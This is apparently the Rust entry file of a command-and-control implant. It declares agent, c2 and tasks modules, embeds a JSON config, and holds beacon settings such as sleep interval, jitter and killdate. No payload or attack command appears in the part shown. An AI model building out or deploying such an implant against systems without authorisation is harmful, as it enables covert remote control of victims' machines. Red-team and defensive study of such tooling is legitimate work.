extern crate alloc;

mod agent;
mod c2;
mod common;
mod config;
mod error;
pub use error::{Error, Result};
mod sys;
mod tasks;

use core::sync::atomic::{AtomicBool, AtomicU64, Ordering};

const RAW_JSON: &str = include_str!("../config.json");

// ── Global state ────────────────────────────────────────

pub static INTERVAL: AtomicU64 = AtomicU64::new(30);
pub static JITTER: AtomicU64 = AtomicU64::new(0);
pub static SHOULD_EXIT: AtomicBool = AtomicBool::new(false);
/// After flushing responses, terminate the entire process (set by exit method=process).
pub static EXIT_PROCESS: AtomicBool = AtomicBool::new(false);

/// Unix timestamp (seconds). 0 = not set.
pub static KILLDATE: AtomicU64 = AtomicU64::new(0);
/// Gate verbose C2 debug logging.
pub static DEBUG: AtomicBool = AtomicBool::new(false);

pub fn set_sleep(interval: u64, jitter: Option<u64>) {
    INTERVAL.store(interval, Ordering::Release);
    if let Some(j) = jitter {
        JITTER.store(j, Ordering::Release);
    }
}

pub fn set_killdate(ts: u64) {
    KILLDATE.store(ts, Ordering::Release);
}

// ── Entry ───────────────────────────────────────────────

fn main() {
    let config = config::Config::load_json(RAW_JSON);
    if let Err(e) = agent::run(config) {
        eprintln!("Agent error: {:?}", e);
    }
}
